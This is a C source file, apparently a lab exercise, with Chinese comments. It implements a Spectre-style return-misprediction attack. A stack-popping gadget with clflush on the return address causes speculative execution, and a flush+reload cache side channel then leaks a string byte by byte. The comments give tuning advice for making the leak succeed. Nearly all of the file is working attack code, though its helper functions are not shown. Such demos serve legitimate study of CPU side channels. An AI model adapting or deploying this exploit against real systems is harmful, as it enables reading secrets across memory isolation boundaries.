// 1. 本实验中秘密地址需设置为全局变量，如果通过参数传递在调用gadget前会保存到和rbp有关的地址中，在推测执行时则会由于rbp变化导致读取错误
// 2. 运行迭代次数应高于999（本处设置为1999），否则可能会无法还原出秘密值
// 3. gadget中的pop数量需要根据实际的栈的内容进行调整

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <x86intrin.h>

uint8_t array[256 * 512];

char *secret_addr = "secret words";
uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void flush()
{
    int i;
    for (i = 0; i < 256; i++)
        _mm_clflush(&array[i * 512]);
}

void gadget()
{
    asm volatile(
        "pop %rdi\n"
        "pop %rdi\n"
        "pop %rdi\n"
        "pop %rdi\n"
        "pop %rbp\n"
        "clflush (%rsp)\n" // flush the return address
        "retq\n");
}

void speculative(char *secret_ptr)
{
    flush(array);
    gadget();
    temp &= array[*secret_addr * 512];
}

void read_secret(char *secret_ptr, uint8_t value[2], int score[2])
{

    static int results[256];
    int tries, j, k;
    unsigned int junk = 0;

    for (int i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        for (int l = 0; l < 10; l++)
            speculative(secret_ptr);
        if (findSecret(array, results, &j, &k, 0))
        {
            break;
        }
    }

    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main()
{
    prepare(array, sizeof(array), secret_addr);

    int len = 12;
    uint8_t value[2];
    int score[2];
    while (--len >= 0)
    {
        // printf("Reading at secret_addr = %p... ", (void * ) secret_addr);
        read_secret(secret_addr, value, score);
        display(secret_addr, value, score);
        secret_addr++;

        /* Display the results */
        // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        // printf("0x%02X=’%c’ score=%d ", value[0],(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

        // if (score[1] > 0) {
        // printf("(second best: 0x%02X=’%c’ score=%d)", value[1],(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
        // }
        // printf("\n");
    }

    return 0;
}
